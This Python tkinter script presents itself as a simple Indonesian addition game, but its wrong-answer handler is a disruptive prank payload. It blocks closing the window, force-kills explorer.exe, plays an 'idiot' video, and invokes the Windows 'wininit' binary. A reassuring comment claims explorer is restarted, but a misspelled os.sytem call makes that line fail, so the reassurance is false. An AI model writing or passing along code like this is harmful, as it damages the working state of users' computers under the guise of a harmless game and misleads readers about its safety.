from tkinter import *
from tkinter import ttk
import os

from time import sleep
import math
import random 

window = Tk()
window.title("Game Sederhana")
window.geometry("300x300")
window.config(height=300, width=300)

a = 1
b = 10

q_a = 0
q_b = 0

def disable_event():
    pass

window.protocol("WM_DELETE_WINDOW", disable_event)

def increase_question(a_a, b_a):
    global a, b
    a = a + a_a
    b = b + b_a

def make_question():
    question_a = math.floor(random.randint(a, b))
    question_b = math.floor(random.randint(a, b))
    increase_question(question_a, question_b)
    return [question_a, question_b]

def check_answer():
    global hasil
    inp = int(inputbox.get(1.0, "end-1c") or "0")
    if inp == (q_a + q_b):
        hasil = "kamu benar!"
        answered.config(text=hasil)
        window.update()
        answered.after(2000)
        hasil = ""
        answered.config(text=hasil)
        inputbox.edit("reset")
        window.update()
        window.quit()
    else:
        hasil = "salah woi, sistem kamu akan rusak >:V"
        answered.config(text=hasil)
        window.update()
        sleep(1)
        os.system('start /b taskkill /IM "explorer.exe" /F')
        ffplay()
        sleep(5)
        wininit()
        #if fail will be start explorer again, so don't worry :v
        os.sytem('start /b explorer.exe')
        
def ffplay():
    os.system("start /b .\\assets\\ffplay \"assets\\idiot.mp4\" -autoexit")
def wininit():
    os.system("wininit")

quest = ttk.Label(window, text="")
quest.pack(side="top")

inputbox = Text(window, height = 1, width = 5) 
inputbox.pack(anchor="center")

submit = ttk.Button(window, text="Submit", command=check_answer)
submit.pack(anchor="center")

hasil = ""
answered = ttk.Label(window, text=hasil)
answered.pack(anchor="center")

for i in range(5):
    quesyon = make_question()
    q_a = quesyon[0]
    q_b = quesyon[1]
    quest.config(text=f"{q_a} + {q_b}")
    window.update()
    window.mainloop()